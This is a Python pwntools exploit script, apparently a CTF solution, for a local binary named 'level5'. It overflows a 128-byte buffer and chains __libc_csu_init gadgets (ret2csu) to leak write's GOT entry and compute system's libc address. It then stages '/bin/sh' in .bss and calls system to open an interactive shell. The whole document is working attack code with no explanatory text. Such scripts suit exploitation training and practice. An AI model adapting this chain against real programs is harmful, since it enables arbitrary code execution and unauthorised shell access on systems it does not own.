from pwn import *

elf = ELF('./level5')
io = process('./level5')
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

first_address = 0x0000000000400606
second_address = 0x00000000004005F0
write_got = elf.got['write']
read_got = elf.got['read']
main_address = elf.symbols['main']
bss_address = elf.bss()

def construct_payload(func, param1, param2, param3):
    payload = b'A'*128 + b'BBBBBBBB' + p64(first_address) + p64(0) + p64(0) + p64(1)
    payload += p64(func) + p64(param1) + p64(param2) + p64(param3)
    payload += p64(second_address) + b'\x00' * 56 + p64(main_address)
    return payload

payload1 = construct_payload(write_got, 1, write_got, 8)

io.sendlineafter('\n',payload1)
sleep(1)

write_real_address = u64(io.recv(8))
system_real_address = write_real_address - (libc.symbols['write'] - libc.symbols['system'])

payload2 = construct_payload(read_got, 0, bss_address, 16)

io.sendlineafter('\n',payload2)
sleep(1)

io.send(p64(system_real_address))
io.send("/bin/sh\x00")

payload3 = construct_payload(bss_address, bss_address + 8, 0, 0)

io.sendlineafter('\n',payload3)
sleep(1)
io.interactive()